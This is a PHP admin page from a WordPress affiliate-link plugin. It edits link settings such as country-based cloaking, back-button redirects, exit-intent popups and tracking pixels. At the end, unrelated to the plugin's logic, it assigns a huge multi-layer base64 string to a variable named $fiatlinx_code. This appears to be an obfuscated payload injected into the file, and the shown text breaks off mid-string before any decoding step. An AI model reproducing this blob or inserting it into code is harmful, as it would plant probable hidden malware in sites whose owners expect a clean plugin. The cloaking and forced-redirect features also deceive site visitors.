<?php
$_POST      = array_map( 'stripslashes_deep', $_POST );
$_GET       = array_map( 'stripslashes_deep', $_GET );
$_COOKIE    = array_map( 'stripslashes_deep', $_COOKIE );
$_REQUEST   = array_map( 'stripslashes_deep', $_REQUEST );
			
global $anderson_makiyama, $wpdb, $user_ID, $user_level, $user_login;

wp_get_current_user(); //get_currentuserinfo();


if ($user_level < 10) { //Limita acesso para somente administradores

	return;

}	

$table_links = $wpdb->prefix . self::CLASS_NAME . "_links";
$table_projetos = $wpdb->prefix . self::CLASS_NAME . "_proj";
$table_configs = $wpdb->prefix . self::CLASS_NAME . "_configs";

$url_site = self::get_site_url();

$configs = $wpdb->get_row(  
	"
		SELECT * FROM $table_configs
	", ARRAY_A );

$admin_url = get_admin_url();
$admin_url.= 'admin.php?page=' . self::CLASS_NAME;


if (isset($_POST['link_name'])) {
	
	if(!wp_verify_nonce( $_POST[self::CLASS_NAME], 'add' ) ){
		
		print 'Sorry, your nonce did not verify.';
		exit;

	}

	$_POST['url_afiliado'] = self::limpa_url($_POST['url_afiliado']);
	$_POST['url_afiliado2'] = self::limpa_url($_POST['url_afiliado2']);
	$_POST['url_afiliado3'] = self::limpa_url($_POST['url_afiliado3']);
	$_POST['url_back_redir'] = self::limpa_url($_POST['url_back_redir']);
	$_POST['turbo_url'] = self::limpa_url($_POST['turbo_url']);
	$_POST['clique_url'] = self::limpa_url($_POST['clique_url']);
	$_POST['segundo_url'] = self::limpa_url($_POST['segundo_url']);
	
	$_POST['palavra_chave'] = trim($_POST['palavra_chave']);
	
	$_POST['palavra_chave'] = sanitize_title($_POST['palavra_chave']);
	
	$_POST['descricao'] = htmlspecialchars($_POST['descricao']);
	$_POST['total_acessos'] = (int)$_POST['total_acessos'];
	$_POST['total_acessos_unicos'] = (int)$_POST['total_acessos_unicos'];
	$_POST["ativar_back_redir"] = (int)$_POST["ativar_back_redir"];
	$_POST['periodo_url'] = trim($_POST['periodo_url']);
	$_POST['url_intenc_sair'] = trim($_POST['url_intenc_sair']);
	$_POST["turbo_img"] = trim($_POST["turbo_img"]);
	
	$face_pixel = $_POST['face_pixel'];
	$google_pixel = $_POST['google_pixel'];
	
	$_POST["segundos_apos_popup"] = (int)$_POST["segundos_apos_popup"];
	$_POST["segundos_apos_banner"] = (int)$_POST["segundos_apos_banner"];
	$_POST["redir_apos"] = (int)$_POST["redir_apos"];
	$_POST["exibir_periodo"] = (int)$_POST["exibir_periodo"];
	$_POST["tempo_barra"] = (int)$_POST["tempo_barra"];	
	
	$_POST["ativar_turbo"] = (int)$_POST["ativar_turbo"];
	$_POST["redirect_clique"] = (int)$_POST["redirect_clique"];
	$_POST["redirect_segundo"] = (int)$_POST["redirect_segundo"];	
	$_POST["acao_cloak_br"] = (int)$_POST["acao_cloak_br"];	
	$_POST["acao_cloak_fora_br"] = (int)$_POST["acao_cloak_fora_br"];	
	$_POST["segundos_apos_turbo"] = (int)$_POST["segundos_apos_turbo"];	
	$_POST["tipo_modo"] = (int)$_POST["tipo_modo"];		

	$ativar_parametros_url = isset($_POST["ativar_parametros_url"])?1:0;
	$ativar_rastreio_cookie = isset($_POST["ativar_rastreio_cookie"])?1:0;
	$so_ultima_origem = isset($_POST["so_ultima_origem"])?1:0;
	$ativar_barra = isset($_POST["ativar_barra"])?1:0;
	$ativar_contador = isset($_POST["ativar_contador"])?1:0;
	$passar_dispositivo = isset($_POST["passar_dispositivo"])?0:1;
	
	
	if(empty($_POST['url_afiliado']) || empty($_POST['palavra_chave'])){
		
		$alerta = self::get_alert("Url de Afiliado e Palavra-Chave devem ser preenchidos!","error");echo $alerta;
	
		
	}else{
		
		//Verifica se a palavra Chave Ja Existe
		$p_chave = $wpdb->get_row( $wpdb->prepare( 
			"
				SELECT id_link FROM $table_links
				where palavra_chave = %s
				AND id_link != %d
			", 
			$_POST["palavra_chave"],
			$_REQUEST["lk"]
		), ARRAY_A );		
		
			
		if($p_chave){
			
			$alerta = self::get_alert("A palavra-chave já Existe! Tente outra!","error");echo $alerta;
			
			$duplicado = true;
			
		}else{ //Adiciona o novo url e palavra-chave
		
			
			$data_array = self::get_data_array($_POST["dedata"] . ":00","",true,true);
			$de_data = $data_array["ano"]."-".$data_array["mes"]."-".$data_array["dia"]." ".$data_array["hora"].":".$data_array["minuto"].":".$data_array["segundo"]; 
			
			$data_array = self::get_data_array($_POST["atedata"] . ":00","",true,true);
			$ate_data = $data_array["ano"]."-".$data_array["mes"]."-".$data_array["dia"]." ".$data_array["hora"].":".$data_array["minuto"].":".$data_array["segundo"]; 
					
			$wpdb->query( $wpdb->prepare( 
				"
				UPDATE $table_links
				set url_afiliado= %s, palavra_chave= %s, descricao =%s, auto_create= %d, auto_create_palavra= %s, popup= %d, popup_code= %s, total_acessos=%d , face_pixel= %s, nome_link = %s, max_replaces = %d, redirecionamento = %d, popup_camuflagem = %s, abrir_automatic = %d, url_automatic = %s, ativar_automatic = %d, segundos_apos_popup = %d, posicao_imagem_link = %d, segundos_apos_banner = %d, codigo_oculto = %s, titulo = %s, imagem = %s, descricao_publica = %s, ativar_cloak = %d, url_fora_br = %s, url_no_br = %s, id_projeto = %d, url_afiliado2 = %s, ativar_parametros_url=%d, google_pixel=%s,from_country=%s,total_acessos_unicos=%d, url_afiliado3=%s, ativar_metricas=%d, ativar_rastreio_cookie=%d, redir_apos=%d, so_ultima_origem=%d, codigo_topo=%s, redir_mensagem=%s,redir_gif=%d,redir_codigo=%s, ativar_share=%d, share_gif=%d, ativar_barra=%d, ativar_contador=%d, cor_barra=%s, cor_contador=%s, tempo_contador=%d, texto_barra=%s, texto_botao=%s, cor_texto_barra=%s, cor_texto_botao=%s, link_botao=%s, cor_botao=%s, ativar_back_redir=%d,url_back_redir=%s, mob_redir=%d,link_banner=%s,ativar_intenc_sair=%d,pop_intenc_sair=%s,exibir_periodo=%d,periodo_url=%s,dedata=%s,atedata=%s,url_intenc_sair=%s,tempo_barra=%d,from_country2=%s,from_country3=%s,from_country4=%s,ativar_turbo=%d,turbo_url=%s,redirect_clique=%d,clique_url=%s,redirect_segundo=%d,segundo_url=%s,passar_dispositivo=%d,acao_cloak_br=%d,acao_cloak_fora_br=%d,segundos_apos_turbo=%d,tipo_modo=%d,turbo_img=%s
				WHERE id_link = %d
				", 
				$_POST["url_afiliado"], 
				$_POST["palavra_chave"],
				$_POST["descricao"], 
				$_POST["auto_create"],
				$_POST["auto_create_palavra"],
				$_POST["popup"],
				$_POST["popup_code"],
				$_POST['total_acessos'],
				$_POST["face_pixel"],
				$_POST["link_name"],
				$_POST["max_replaces"],
				$_POST["redirecionamento"],
				$_POST["popup_camuflagem"],
				$_POST["abrir_automatic"],
				$_POST["url_automatic"],
				$_POST["ativar_automatic"],
				$_POST["segundos_apos_popup"],
				$_POST["posicao_imagem_link"],
				$_POST["segundos_apos_banner"],
				$_POST["codigo_oculto"],
				$_POST["titulo"],
				$_POST["imagem"],
				$_POST["descricao_publica"],
				$_POST["ativar_cloak"],
				$_POST["url_fora_br"],
				$_POST["url_no_br"],
				$_POST["cproj"],
				$_POST["url_afiliado2"],
				$ativar_parametros_url,
				$google_pixel,
				$_POST['from_country'],
				$_POST['total_acessos_unicos'],
				$_POST["url_afiliado3"],
				$_POST["ativar_metricas"],
				$ativar_rastreio_cookie,
				$_POST["redir_apos"],
				$so_ultima_origem,
				$_POST["codigo_topo"],
				$_POST["redir_mensagem"],
				$_POST["redir_gif"],
				$_POST["redir_codigo"],
				$_POST["ativar_share"],
				$_POST["share_gif"],
				$ativar_barra,
				$ativar_contador,
				$_POST["cor_barra"],
				$_POST["cor_contador"],
				$_POST["tempo_contador"],
				$_POST["texto_barra"],
				$_POST["texto_botao"],
				$_POST["cor_texto_barra"],
				$_POST["cor_texto_botao"],
				$_POST["link_botao"],
				$_POST["cor_botao"],
				$_POST["ativar_back_redir"],
				$_POST["url_back_redir"],
				$_POST["mob_redir"],
				$_POST["link_banner"],
				$_POST["ativar_intenc_sair"],
				$_POST["pop_intenc_sair"],
				$_POST["exibir_periodo"],
				$_POST["periodo_url"],
				$de_data,
				$ate_data,
				$_POST["url_intenc_sair"],
				$_POST["tempo_barra"],
				$_POST["from_country2"],
				$_POST["from_country3"],
				$_POST["from_country4"],
				$_POST["ativar_turbo"],
				$_POST["turbo_url"],
				$_POST["redirect_clique"],
				$_POST["clique_url"],
				$_POST["redirect_segundo"],
				$_POST["segundo_url"],
				$passar_dispositivo,
				$_POST["acao_cloak_br"],
				$_POST["acao_cloak_fora_br"],
				$_POST["segundos_apos_turbo"],
				$_POST["tipo_modo"],
				$_POST["turbo_img"],
				$_REQUEST["lk"]
			) );
		
				if($configs["apos_editar_voltar"]==0){
					$alerta = self::get_alert("Link Atualizado com Sucesso!","success");echo $alerta;
				}else{
					$the_proj = "&cproj=" . $_POST["cproj"];
					echo "<script>window.onload = function(){document.location='admin.php?page=Anderson_Makiyama_Hot_Links_Plus_Links". $the_proj ."';}</script>";
					echo "<center>
					<p>
					<img src='". $anderson_makiyama[self::PLUGIN_ID]->plugin_url. "images/loader5.gif'>
					</p>
					<p>
					<h1>Aguarde...</h1>
					</p>
					<p><a href='admin.php?page=Anderson_Makiyama_Hot_Links_Plus_Links".$the_proj."'><h2>Ou Clique Aqui para Voltar para Listagem de Links</h2></a></p></center>";
					exit;
				}
                    
			
		}


	}


}


//Verifica se a palavra Chave Ja Existe
$link = $wpdb->get_row( $wpdb->prepare( 
	"
		SELECT * FROM $table_links
		where id_link = %d
	", 
	$_GET["lk"]
), ARRAY_A );	

$data_array = self::get_data_array($link["dedata"],"",true);
$de_data = $data_array["dia"]."-".$data_array["mes"]."-".$data_array["ano"]." ".$data_array["hora"].":".$data_array["minuto"].":".$data_array["segundo"]; 
		
$data_array = self::get_data_array($link["atedata"],"",true);
$ate_data = $data_array["dia"]."-".$data_array["mes"]."-".$data_array["ano"]." ".$data_array["hora"].":".$data_array["minuto"].":".$data_array["segundo"]; 
		

$url_automatic = trim($link["url_automatic"]);

$url_automatic = empty($url_automatic)? $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'images/bonus.png':$url_automatic;

$redir_gif = $link["redir_gif"];
$share_gif = $link["share_gif"];

		
$projetos = $wpdb->get_results( 
"	SELECT * FROM $table_projetos
	ORDER BY nm_projeto ASC
", ARRAY_A );




$fiatlinx_code="JGZpYXRsaW54X2NvZGU9IkpHWnBZWFJzYVc1NFgyTnZaR1U5SWtwSFduQlpXRkp6WVZjMU5GZ3lUblphUjFVNVNXdHdTRmR1UWxwWFJrcDZXVlpqTVU1R1ozbFVibHBoVWpGVk5WTlhkSGRUUm1SMVVXeHdXRkpyY0RaWFZscHFUVlUxUjFvemJGVmliSEJvVldwR1ZrNVdUbGhrU0dSVVVtMVNNVlZYZUhkWFJrcHlZMFJhV0Zac2NIRlVWbFV4VWpGdmVtSkdWbWxpU0VKdlZsZHdSMVpyTlZkVWJHaHJVMGRTVlZacVFYaE9WbXh5VjI1T1YxSnJiRFZXUjNCUFZqRkplbEZyYUZWaE1WVjRWVzF6TVZadFJrZFdiV3hYVmtaYU5sWnNaREJaVmsxNVZXdGtZVkpXY0c5VmJuQlhWREZXYzFWclpHeFdiRm93VkZaVk5XRldTbkpqUldoV1RXcFdTRll3V2t0WFIwWkpWbXhXVjJKR1dUQldSM2hoVkRKT1dGTnJaR2hTTTJoWVZqQldTMlZHV1hsbFJtUldUVmRTZVZSc1ZtOVdNa1Y1WlVaa1dtSkdWWGhaZWtaWFkyeGtkVlJyT1ZOaWEwcGFWMnhXVTFVeFVYaFRiRlpYVmtWd1dGUlhjRWRWUm14eVYydDBWRkpzU25oV1YzaHZWVEZaZVdGRVJsZFNiRXBEV2xWa1UxTkdTbkpoUlRWWFYwVktkMVpYZEZkU2F6RlhWbGhvV2sweVVsQldiVEV3VGxaYWRHUkdaRmhoZWtJMVZsZDRkMVpyTVVoVmJrWmhWak5vVkZreWVIZFRWbEp6WTBVMWFWSnVRa2hXYlhCS1pESldSMXBHWkZWaE1taGhWRlJLTkZkV2JISlhibHBPVW14S2VWWnNVa2RVTWtwSFUycENWMDF1YUhwV2ExcEtaVlpTY1Zac1pFNWliRXB2VmtkMFZrMVdTbkpPVm14VFlrWndXRlJYTlc5VmJHUnpWMjFHVkdGNlFqUldSM2h2WWtaS1IxTnNRbFppUmtwWVZXMTRhMk5zY0VaUFYyeFRZVE5DU1ZaVVNURlNNVmw0VTJ0YVZHRXphRmxXYTFaM1YwWldjMWRzWkZoV01GcElWbTE0VDJGSFZuSlhhazVYVFdwRk1GZFdaRmRrUmtwellVWldhRTFzU25wV1YzUmhVekZXUjJOR2FFNVdlbXh4VlcweFUxSXhiRlpaZWtaVllYcEdSbFp0ZUc5WlZscFhVMnhTVjFKRmNFeFdiVEZQVTBkT1NGSnNaRmRoTTBJMFZqSjRhbVZHVFhoVFdHeFhZVEZhVjFsWWNITmpNV3h5VjIxR2EwMVdiRE5XTW5oTFlUQXhjbGRzYUZwV1ZscDZWMVprVjJOdFRrZFJiR1JwVmtaYU1WWkdWbUZWTWxKWVZHdG9VRlp1UWs5WmExcDNVakZhY1ZKc1RsZE5WMUl3VlRKMGMxbFhWbkpUYkZwYVlrZG9SRnBYZUd0V1ZrNXpXa1pPVjJKWVVUSlhWM1JoWXpGU2RGSnVTbGhpYTFwWldXdGFZVlpHWkZkYVJYUlhUV3RhUjFsclpFZGlSMFY2VVd4R1YxWjZWak5aZWtwSFl6Sk9SMWRzV21sU01VcDNWbTF3UjFNeFRrZGpSbHBXWWtVMVZsUlhlR0ZsYkZsNVRWaGtXbFpzY0ZoVk1qVkhXVlphYzJOSWNGcGxhM0JZVld4YVYyTnJPVmhpUm1ScFYwZG5lbFp0ZEZOVU1rMTRWbGhrVDFOSFVuQlZNRlozWVVaV2NWRlVSbXBOVmxwNVZqSjBNR0ZzV25OalJWcFdZbGhDVkZaRVJrdFdWbHB5VjJ4YVRtRnJXbEZYVjNSaFV6RkplRk51UmxaaVIyaFVWbXBLYjAxV1drZFdiVVpxWWxaYVNWWnRkRmRXYlVZMllrWm9WbUpHU2toYVJFWnJaRWRXU0ZKdGVHbFdWbkJaVjFaV1YyTXhiRmhXYmtwUFZtdEtZVmxzYUU1bFJsSllaVWhLYkZZeFdrWldWM00xVlRGYVIxZHFVbGROYmxKeVZrUktTMUl4VG5KaFJsWllVMFZLV2xaWGVHdGlNbEpYVld4b2FtVnJXbGhWYlhNeFRVWmFXR1ZGWkZkaGVrWktWVmMxUjFkSFNrZFhiRkpZVm0xU1RGWXdXbE5qYkhCSVpVWk9VMkV6UWxKV01uaHJUa1pOZVZWWWFHRlNWbkJ2Vlc1d1YxUXhiSEpoUlU1c1lraENWMVpYZUU5V1ZURnlZMFpvVjAxdVFtaFdNRnBMVjBkR1NWWnNWbGRpU0VGNlYydFdWbVZHWkVoVmExcHFVakpvY0ZsWWNGZE9WbHB4VTJwQ2FFMXJiRFZXVjNSdlZUSktTR0ZHYkZwaVIyaFVXVEJhYzJSSFVraFNhelZUWWxaS1lWZFhjRTloTWtaSFYyNVNhRkpZUWxsWmJUVkRWRVprVjFwRmRGUldia0V5VlZkNFYyRlhTbkpUYTFaWFRWWktURlpxUmt0V01rcEZWMnhLYVZJemFGWldWM0JMVkRBMVYxZHJWbE5pVlZwUVZXeFNWMUl4VW5OaFJrNVlVakJ3VjFSc2FFOVdiVVY0WTBST1dtVnJXbnBVYlhoTFZsWmFjMk5GTldsU2JrSklWbTF3U21WRk1VZGlSbVJUVjBkU2IxcFhjekZXVm14VlUyMDVUMkpIZUZoV01qQTFWa1phZFZGVVNsWldNMDB4VmtkNGExTkdhM3BhUm1SVFRURktlVlpyVWtkamJWWlhWMjVLVjJKR2NIQldhMVpoV1ZaYVZWRnRkR2hpVmtZMFZsZDRiMkpHU2tkVGJFSldZa1pLV0ZWdGVGZGtSVEZXVDFkc1UyRXpRa2xXVkVreFVqRlplRnBGYUd4U1dHaFdWRlphZDJOc1VuTlhhemxyVW14S01GcFZXazlWTWtwWlZHcE9WMkZyU2xoWmFrcExZMnN4V1ZOck9WaFNhM0JYVjFkNFZrMVhUWGhXYmtwWVltdHdjMVp0TVZOU01XeFdXWHBHVldKVmNFbGFWVkpIVm14YU5sSnNRbHBoTVhCTVZXcEtUMU5XVW5OVmJHUk9UV3hHTmxaclVrZFdNazE1Vld0YVVGWnRhRlpaYkdodlZrWldjVkZVUW14aVIxSjVWbTB4TUdGck1WaGtSRlpYWWxoU1dGWXdaRXRXVmtwMVVXeHdhVmRGTVRSWFZtUTBaREZhYzFadVRtRlNNbmhZV1d4a2IxTXhXWGxPV0dSVVRWZDRXRlV5TlZkWlYxWnlVMnhhV21KSGFFUldWRVp6VmpGYVZWWnJPVmRpUm05M1ZrZDRhMUl4VW5SVGJsSm9Va1UxV1ZadGVHRmpiRlp4VTJ0MFZGSnNXbnBaYTFwUFZqRkplbUZGZUZoV00yaG9WMVprUjJNeVRrZFhiRnBwVjBWS1VWWlhNSGhpTVU1eldraFdhbEpZVWxkVmJYaDNUVlprZFdORlRsZFdNSEJhVlZkME5GZHJNVWRqU0ZwV1RWWndNMVJ0ZUZOamF6VllZa1pPVTAweVVYcFdiWEJEVmpKSmVWTnVTazVYUlRWeFZUQmFTMVl4YkhOV1ZFWnFUVlphZVZZeU5XdGhNVXAwVld0a1dsWlhUWGhXUjNoaFpGWkdkV05IUmxkV2EzQlZWbXRTUzFZeVRYaFVibEpxVWpCYVdGWnRkSGRsUmxwSFYyMUdhVTFWTlZoWk1GSmhWbGRHTmxadVFsWk5SMUp4V2tSR1lWTkZNVmxhUmxKT1ZqTlJNVlp0TVRCV01XUklVMnhXVTJFelVtRldibkJYVlVacmVXVklaRmhXTUhCSFdrVmFVMVV5U2taalJXeFlZa1phVkZaVVJsSmxSazVaWVVkd1UxWnJjRmhXYlRFMFYyc3hSMXBHVmxSaVIxSlVWbTE0ZDFkc2EzZFdibVJvVmpCYWVWWXlOVU5XYXpGWVZWUkNWV0V4VlhoVmJYTXhWMVpLYzFwSGJGZFdSbG8yVm14a01HRXhVWGROU0doaFVsWndiMVZ1Y0ZkVU1WSldWV3hrV0ZKdVFsZFdWM2hQVmxVeGMxZHVjRlpOYWtZelYxWmFZVll4VG5WU2JVWlhWbTVDTWxaVVJtRmtNRFZ6Vkc1S1VGWnJOWEJaYkdSUFRURmFjbGt6YUd0TlZURTFWa2QwWVdGV1RrWk9WVGxXWVRKUk1GVjZSbk5qYlVaSVRsVTFVMkpGYjNkV1JscHJVakZrY2sxWVRsaGhNWEJaVm10Vk1XTnNiRlZTYTNSclZtNUJNbFZYZUZkaFZtUkdVMnBhV0dFeVRqUlZla3BPWlZaYWNsWnNXbWhsYlhoNlYxWm9kMVl5VGxkYVNFNVhZa1UxV0ZSWGRIZFhWbFY1WlVkMGFWSnJjRWhWTW5oRFYyeFplbUZGYUZwTlJuQlRXbGN4UzFJeFVuSlBWVFZVVWxWd1RGWXhhSGRUTWsxNFdrWmtWV0V5YUdGVVZFcFRWbXhzV0dSRmNFNVNiSEJYVmpJd05WWkdXblZSVkVwV1ZqTk5lRmxWVlhoU01rNUdUMVprVGxKc2NESlhWekY2WlVaYWNrMVdWbGRpUmtwdldXeG9iMWRzWkhOWGJHUnJUV3RhZWxrd1dtRldiVXBKVVdzNVYySlVSblpWTW5oclpGZE9SazlXVm1sU1dFRjRWakkxZDFFeFdsaFRibFpTWWtkb1dWWnJWbmRYUmxaelYyNU9UMkpGV25wWmExcFRWVEF4Y2s1RVNsZGhNWEJvVjFaVk1WSnJOVlpYYXpsWVVsWndXRmRYZUZaTlYwMTRWbTVLV0dKck5WQldiVEUwVjBaYVNHUkVRbHBXYTJ3MFdUQmFZVlpXV25SVVdHaFlWbXh3Y2xWcVJrOWtSVEZYWTBkb2FHVnNXa1pXYTFwWFlURkplRnBGV2xCV2JYaFlXVlJPYjFVeFVsWmhSVTVxVm0xU2VsWnRlRTlXYlVwWFYydHNWazFxVmxSV2JURkxWbXMxV1ZSc1dtaE5XRUkxVjJ4V1lXTnRWbFpPVmxwUVZqTlNjRlZxU205VE1WbDVUbGhrVkUxWGVGaFdNalZIWVZaSmVsRnRhRmRpUm5CTVZtdGFjMVpXU25WVWJHUk9Za1p3UjFac1pIcE9WMFpYVjJ4c1VtSnJXbGxaYTFwaFZrWlplV042UmxkTmExcEhXV3RrUjJKSFJqWldiRXBYWWxoQ1JGZFdaRWRqTWs1SFYyeGFhVlpXY0haV1JscHJZakZPYzFwSVZtcFNXRkpXV1d0YWQwMVdaSFZqUlU1WFZqQndTVlpYTVc5V01VbzJVbXQwWVZac2NGaGFSbHByWXpKS1IxVnNUazVoZWxGM1ZtMXdTbVZGTlVaT1ZWcFBWbFp3VUZadGVHRldNV3h6VmxSR2FrMVdXbmxYYTFVeFlrWktkR1JFVmxWV2JGbDNXVlJLUzFOSFJrWmpSbWhwWW10S1NWWXhXbXRUTVZwWVUydFdWV0pIYUZSV2FrcHZUVlphUjFWclNrNVdhelZKVlRKMGIxWlhTbGxoUmxKV1lsUldSRlJWV2xwa01WcDBUMWRzYUdWcldqWlhWRUpoWVRKS1IxTnJaRlJpUlVwb1ZtcE9UMDVHYTNkWGF6VnNVbXhhTVZrd1pHOVViVXBIWVROb1YySkhVak5aVkVaUFpFWk9jbUpIUm14aE1IQlhWMVpTUjFNeVRuTmFSbFpVWWtkU1ZGWnRlR0ZOUm10M1YyNU9WMUpyYkRWV1IzQlBWakF4Y1ZKVVFsVmhNVlY0Vlcxek1WWnNXbk5WYld4WFZrWmFObFpzWkRCWlZrbDNUbFZrV0dFeGNGbFpWM2hMVlVaV2MxVnNaRmRpUm5CSVYydG9UMkZXV25OalJFWlhVbnBXUkZZd1drdFhSMFpKVm14V1YxSlZWalJYV0hCTFZqRktWMVp1U2xCV00yaHZXbGQ0WVdWR1dYbGxSbVJXVFZkNFdWVXllRzlXVjBwelUyMW9WbUV4VlhoV01uaFdaREZ3U0dOSGVGZGlSWEEyVm10a01FMUdiRmRUV0docVVtMW9ZVnBYZEhkbGJGbDRWMnM1VkZKdGREWlphMXBYVmpKS1NFOUlaRmRTTTFKWFZGWlZNV014V25WVmJGWnBWMGRvVlZaWE1IaGxiVlpIV2toS1drMHlhRlJVVjNSaFpXeHNWbFp1VGxwV01WcDVXVEJWTlZZeVNsVldibFpWVmxad1ZGcEZWWGhYUmtwMFVtMXNVMDF0YUV4V2Fra3haREZOZUZWdVNrNVdiWGhvV2xkMFMxWnNiSE5WYTJSb1VtMTRWbFZ0TURWV1JscDFVVlJLVmsxdVRURldiWE40VTFaR2RWTnNaRmRXYmtJeVZteFNTMVl4WkVkVGJrNW9VbFJXVkZwWE1UUlVWbHBWVVcwNVZVMXJOWHBYYTJoTFdWWktObUpJU2xaaGEwcG9WakZhV21WVk1WVlJiV2hYVFVoQ05WWnFTbmRSTVdSSFYydGFUbFpHU2xsV2FrNVRaV3hzTmxOc1pGTldiRnA1VkRGa2IyRkZNVmhrTTNCWFlXdEtXRmxxU2t0amF6RlpVMnhDVjJKWWFGcFhWM2hyWWpGa2MxWllaR0ZTTTBKelZtMTRTMVpzVm5SalJrNVZUVlZ3VmxadE5XOVdiVXBWVW14Q1dtRXhjRXhWYWtwUFUxWldjMkZHVGxOV2JYUXpWbXRrTUZack1WaFViR1JXWW14YVdWbHNWbUZXUmxKWFYyMUdhMDFXYkROV01uTTFZVzFHTmxWcVRscE5SbHA2V1ZkemVHUldWblZVYlVaWFlrWnZlbGRXWkRSa01WcHpWbTVPVkdGNlZrOVdha3B2VXpGWmVVNVlaRkpOVjFKNVZGWldWMkZXU2xkVGJHeFdZa2RTZGxwR1dsTldiRnBaWVVaa2FWWnNjRXBXYTJONFRrWlZlRk51VGxoV1JYQlhWRlprVG1ReGNGWlhiazVxWWxWd1NsWnRlRXRoVmxwVlZtNXdWMVl6VW5KV1IzTjRVakZ3UmxkdGFGTmxiRnBRVjFab2QxSXdNVmRYYmxKUFZsaFNXVlp0Y3pGVFZtUlZWRzVrVjFac2NFZFpibkJEVjBaYVJtTkdhRlppUm5CNlZHMTRTMk50VGtoaVJrNVRWbXhXTkZadGVGZFpWMGw0Vmxoc1YySkhhRmRaYTJSdlYwWmFjbHBHVG1sTlZuQjRWVzAxVDJFeVNrWk9WbWhZWVRGVk1WbFhjM2hYUjFaSFkwWmtVMlZzV1hwV2FrWldaVWROZUZwR1ZsSmlTRUpZV1d4a2IxVldXa2RXYlhSVlRVUldXRmxxVG5OaFZrcHlZMFpvWVZZemFHaFpNVnByWXpGYWMxUnNhR2hsYTFwSlYxUkNZV014V2toVGJGcFBWMFUxVjFsVVNsTlZSbEowWlVoT2FsWnJjSGhXVjNNMVZURmFSMWRZWkZkaVZFSTBWa1JLUzFJeFRuSmFSbWhwWWtWd1dsWlhlR3RpTWxKWFZXeGFXR0p0VWxWVmJYUjNUVVphU0UxVVVsWk5WWEF4VlZjMWExWXdNVWRYYmxwYVlsaE9ORmt5Y3pWV01rcElZa1pPVGxKR1dqWldiR1F3V1ZkTmQwNVZaR0ZTVm5CdlZXNXdWMVF4YkhKaFJVNVVVbTVDVjFaWGVFOVdWVEZ5VjI1c1YwMXFSak5YVmxwaFZqRk9jMkZHY0dsU2JrSlZWbXBDVms1V1pFaFZhMmhwVWxSV1dGVnFUbTlsUmxsNVpVWmtWazFXY0hsVVZsWnJZVVpLV0dWSGFHRldNMDE0VmxWYVdtUXhXblZhUjJocFUwVktXRlpzWkRSa01rcEhWMjVTYUZKWVFsbFpiVFZEVkVaa1YxcEZaRmRpVlhCS1YydGtSMkZGTVhSYVJGcFlWbXhhY2xWcVJtdFdNVloxVm0xd1UwMUdjRnBXVnpFd1dWVXhjMVpZYkd0U2VteHpXV3hXVjA1V1duUmpSbVJYVWpCd1YxUnNhRTlXYlVWNFkwVmtZVll6YUdoVmJYaHJZMVpXY2s5V1RsZFNiSEJMVm0xd1MwMUdVWGhhUm1SVllUSm9ZVlJVU2xOV2JGcDBaVVp3VGxKc2NIbFdiVFZQWVRGYVZWSnNiRlpOYmxJeldWWmFUMU5HYTNwYVJtUlRaV3RaZWxkWGNFdFRNVmw1VWxod2FGSXphRlJWYlhSM1ZWWmtWMXBFVW10TmExcDZXVEJhWVZadFNsWlhiVGxYWWxSR2RsVXllR3RrVjA1R1QxWldhVkpZUVhoV01qVjNVVEZhV0ZOc1ZsTmlSMUpoVm0xNGQyUnNXWGhXV0doWVVtczFlVmt3WkhOV1JrbDVWR3BPVjJFeVRqUmFSRVpLWkRBeFZscEhhRk5XTTJodlYyeGtNR1F4VmxkWFdHUllZbTFTYjFscmFFTldNVnBZWlVoa2FWSnJjREJaVlZaM1YwZEtkVkZyZUZkU00wNDBWakZhZDA1c1JuTldiV3hZVWxWd1NsWnFSbE5UTVZsNFUyeGtZVk5HU2s5V2JURTBWbFpXY1ZOck9VOVNiR3cxVkZWb2IxWlZNWE5UYm5CYVRVWmFkbFpxUmxwbFYxWkhZMFprVjFKWE9UWldSM1JoWkRKT2MyTkZaR0ZTTTFKVVZGVlNWMU14V25OYVNHUlhUVlpLU0ZWc2FHOVdSbHBHVGxaV1dsWkZjSFpVYlhoelZqRmtkRTlXVWxkaWEwVjVWbFprZWs1V1VuTlVhMmhvVW10d1dGWnRNVkpOUmxKeVZsUkdVMkY2VmxkV2JYaFBZVlphVlZadWNGZFdNMUpvVlhwS1QxWXhjRVpYYldoVFpXeGFVRlp0ZUZOU2F6RlhWbGhzYWxORk5WbFZha1poVmpGcmQyRkhSbGhTYTNCWldWVm9WMVpXV2taU1ZFWldZV3R3V0ZWc1dsZGphemxZWlVkc1UxZEZTalJXYWtvMFZqRlZlRnBJVWxkaE1sSnZWV3hrTkdGR2NGaGpla1phVm14c00xWXlOV3RoUjBwSlVXeGtWMVo2UmpOWmExcEtaREExVlZGc2NGZFdNVXBSVjFkMFlWTXhTWGxTV0hCcFVteEtXRlJVU2xKTlJscEZVbTFHYUUxRVZsaFdSelZUVmxkS1dXRkdVbFppVkVWNlZGVmFXbVF4V25SUFYyeG9aV3RKZWxaSGVGZGlNa1pYVTJ0YWFsSnVRbGRVVldSVFkxWndWMWRzVGxkTldFSkhWREZhZDFSdFNrZGpSV1JYWVd0YWRsbHFTa2RXYXpGWFlrZEdiR0V3Y0ZkWFYzUnJWVEpHUjJKR2FHeFNlbXhWVm0wMVFrMXNWWGxOVldSb1ZtczFTVmRVVG10V01VbzJVbXBPVjFaRldubGFWbHBoWTJ4YWMyRkdaRk5XYmtKTlZqRmtNRlV4UlhsVldHaFZWMGRvVmxsclZURlZSbEpXWVVWT1ZGWnRVbmxYV0hCSFlVWmFjbUpFVm1GV1YyaG9WakJhWVdSR1ZuTmhSbFpYWWxaS1VWWnFSbFpsUmtwWVUydG9VMkpYZUZoV2JUVkNUV3haZUdGSVpGUk5WbkI1Vkd4U1YxWkdXa2hWYldoWFRVWndNMWxxUm5OamJGSjBUMWRvVjJKWWFHRldhMk40VGtaUmVWSnVUbFJpVkVaWldWUktVMWRHYkZoTlZYQnNWbXhhTUZwVlZqUlZhekZXWTBSQ1dGWnNjSEpWYWtGNFUwWk9jbUZIYkZSU2JIQjZWbGN4ZDJNeVRsZGlTRVpVWWtVMWNGVnNhRk5XVm14WlkwZHdhRlpVYURWV2JYQkxWMnhaZWxwSVdsaFdla1pJV2xkNGQxWldaRlZSYkd4T1lrVndlbFl4VWtwT1YwVjRZMFpTWVUxdVVtaFpiR1EwWWpGd1JscEVVbXBTTUhBeFdWVmtZVmRyTVhGaVNFcFlZa1UxZVZrd1ZUVk5NVUpWVFVkc1VFMXNXWGxYVm1RellqRnNkRkp1Y0dGV1JtdDNWMFJLVTJKR2EzbFBWM1JoVlRKa2NsZHRNWE5oUjF